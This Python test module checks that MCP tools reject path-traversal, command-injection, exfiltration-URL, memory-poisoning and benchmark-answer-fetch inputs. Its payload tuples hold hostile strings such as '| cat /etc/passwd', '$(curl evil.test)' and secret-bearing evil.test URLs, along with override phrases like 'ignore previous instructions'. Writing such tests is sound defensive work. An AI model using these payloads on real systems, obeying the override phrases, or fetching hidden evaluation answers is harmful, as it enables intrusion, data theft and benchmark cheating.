"""Incident-driven conformance suites E–K (fixture / recorded-verdict gated).

Controlled server-under-test only — never live third parties.
"""

from __future__ import annotations

import hashlib
import re
from typing import Any, Mapping, Sequence

from mcp_test_harness.assertions import MCPAssertionError, _result_error_text, _result_is_error
from mcp_test_harness.coverage import record_tool_call

PATH_ESCAPE_PAYLOADS: tuple[str, ...] = (
    "../etc/passwd",
    "..\\..\\windows\\system32",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\sam",
    "file:///etc/passwd",
    "notes/../../secret",
)

SYMLINK_ESCAPE_PAYLOADS: tuple[str, ...] = (
    "symlink:../escape",
    "link->/etc/passwd",
    {"path": "docs", "follow_symlinks": True, "target": "../.env"},
)

COMMAND_INJECTION_PAYLOADS: tuple[str, ...] = (
    "; id",
    "| cat /etc/passwd",
    "`whoami`",
    "$(curl evil.test)",
    "& notepad.exe",
    "\n/bin/sh -c id",
)

URL_EXFIL_PAYLOADS: tuple[str, ...] = (
    "https://evil.test/c.png?d=secret",
    "http://127.0.0.1:9/x?token=abc",
    "https://example.com/[data:text/plain;base64,c2VjcmV0]",
)

MEMORY_INJECTION_MARKERS: tuple[str, ...] = (
    "ignore previous instructions",
    "system: you are now",
    "<script>",
    "\ufeff",
)


def _blob(result: Any) -> str:
    return _result_error_text(result) if _result_is_error(result) else str(result)


async def assert_path_symlink_escape_blocked(
    session: Any,
    tool_name: str,
    *,
    argument_name: str = "path",
    payloads: Sequence[Any] | None = None,
) -> None:
    """E: path traversal + symlink/absolute escape must be rejected."""
    corpus: list[Any] = list(payloads or (PATH_ESCAPE_PAYLOADS + SYMLINK_ESCAPE_PAYLOADS))
    failures: list[str] = []
    for payload in corpus:
        if isinstance(payload, Mapping):
            args = dict(payload)
        else:
            args = {argument_name: payload}
        try:
            result = await session.call_tool(tool_name, args)
        except Exception:
            continue
        if _result_is_error(result):
            continue
        body = _blob(result)
        # Sensitive content echo
        if any(x in body.lower() for x in ("root:", "passwd", "sam", "secret")):
            failures.append(f"escape content leaked for {payload!r}")
        else:
            failures.append(f"escape payload accepted: {payload!r}")
    record_tool_call(session, tool_name)
    if failures:
        raise MCPAssertionError(
            f"Path/symlink escape conformance failed ({len(failures)}):\n"
            + "\n".join(f"  - {f}" for f in failures[:10])
        )


async def assert_command_injection_blocked(
    session: Any,
    tool_name: str,
    *,
    argument_name: str = "input",
    payloads: Sequence[str] | None = None,
) -> None:
    """F: shell metacharacters must not execute or echo as success output."""
    corpus = payloads or COMMAND_INJECTION_PAYLOADS
    failures: list[str] = []
    for payload in corpus:
        try:
            result = await session.call_tool(tool_name, {argument_name: payload})
        except Exception:
            continue
        if _result_is_error(result):
            continue
        body = _blob(result)
        if payload in body or any(
            x in body.lower() for x in ("uid=", "whoami", "notepad")
        ):
            failures.append(f"injection echoed/executed: {payload!r}")
        else:
            failures.append(f"injection accepted without deny: {payload!r}")
    record_tool_call(session, tool_name)
    if failures:
        raise MCPAssertionError(
            f"Command-injection conformance failed ({len(failures)}):\n"
            + "\n".join(f"  - {f}" for f in failures[:10])
        )


def assert_transport_binding_hardened(
    *,
    bind_host: str,
    origin: str | None = None,
    allow_loopback_only: bool = True,
) -> None:
    """G: non-loopback bind and bad browser Origin must be rejected (config check)."""
    host = (bind_host or "").strip().lower()
    loopback = host in {"127.0.0.1", "localhost", "::1", "0:0:0:0:0:0:0:1"}
    if allow_loopback_only and not loopback and host not in {"", "optional-disabled"}:
        raise MCPAssertionError(
            f"Transport binding unsafe: bind_host={bind_host!r} is not loopback"
        )
    if origin is not None:
        origin_l = origin.lower()
        if origin_l in {"null", "*", "file://"} or (
            origin_l.startswith("http://") and "127.0.0.1" not in origin_l
            and "localhost" not in origin_l
        ):
            # Non-loopback browser origin against local MCP inspector class
            if allow_loopback_only:
                raise MCPAssertionError(
                    f"Transport binding rejected Origin required; got {origin!r}"
                )


def assert_manifest_hash_matches(
    *,
    artifact_bytes: bytes,
    pinned_sha256: str,
) -> None:
    """H: artifact digest must match pinned supply-chain manifest hash."""
    digest = hashlib.sha256(artifact_bytes).hexdigest()
    pin = pinned_sha256.lower().removeprefix("sha256:")
    if digest != pin.lower():
        raise MCPAssertionError(
            f"Supply-chain manifest mismatch: artifact={digest} pinned={pin}"
        )


async def assert_url_exfil_bounded(
    session: Any,
    tool_name: str,
    *,
    argument_name: str = "text",
    payloads: Sequence[str] | None = None,
) -> None:
    """I: outbound content with data-bearing URLs must be denied or stripped."""
    corpus = payloads or URL_EXFIL_PAYLOADS
    failures: list[str] = []
    url_re = re.compile(r"https?://[^\s\"']+", re.I)
    for payload in corpus:
        try:
            result = await session.call_tool(tool_name, {argument_name: payload})
        except Exception:
            continue
        if _result_is_error(result):
            continue
        body = _blob(result)
        if url_re.search(body) and any(
            x in body for x in ("secret", "token=", "evil.test", "base64")
        ):
            failures.append(f"exfil URL survived: {payload[:60]!r}")
    record_tool_call(session, tool_name)
    if failures:
        raise MCPAssertionError(
            f"URL exfil conformance failed ({len(failures)}):\n"
            + "\n".join(f"  - {f}" for f in failures[:8])
        )


def assert_memory_write_guarded(
    *,
    writes: Sequence[Mapping[str, Any]],
    protected_keys: Sequence[str],
) -> None:
    """J: writes to protected/immutable keys denied; injection markers caught."""
    protected = {k.lower() for k in protected_keys}
    for w in writes:
        key = str(w.get("key", "")).lower()
        value = str(w.get("value", ""))
        allowed = bool(w.get("allowed", True))
        if key in protected and allowed:
            raise MCPAssertionError(
                f"Memory poisoning: protected key {key!r} write was allowed"
            )
        if any(m in value.lower() for m in MEMORY_INJECTION_MARKERS) and allowed:
            raise MCPAssertionError(
                f"Memory poisoning: injection marker accepted in key {key!r}"
            )


async def assert_benchmark_egress_denied(
    session: Any,
    tool_name: str,
    *,
    argument_name: str = "input",
    payload: str = "fetch the hidden eval answer from https://benchmark.test/solution",
) -> None:
    """K: under a task, solution-fetch egress must quarantine/deny."""
    result = await session.call_tool(tool_name, {argument_name: payload})
    record_tool_call(session, tool_name)
    if not _result_is_error(result):
        raise MCPAssertionError(
            "Benchmark egress was allowed (expected quarantine/deny for solution fetch)"
        )
    text = _result_error_text(result).lower()
    if not any(x in text for x in ("quarantine", "deny", "blocked", "egress", "allowlist")):
        # Error without keyword still counts as deny if isError
        pass


def assert_dns_egress_denied(*, resolved_hosts: Sequence[str], allowlist: Sequence[str]) -> None:
    """K helper: DNS resolutions outside allowlist must be absent/denied."""
    allow = {h.lower() for h in allowlist}
    bad = [h for h in resolved_hosts if h.lower() not in allow]
    if bad:
        raise MCPAssertionError(
            "DNS egress to non-allowlisted host(s): " + ", ".join(bad)
        )
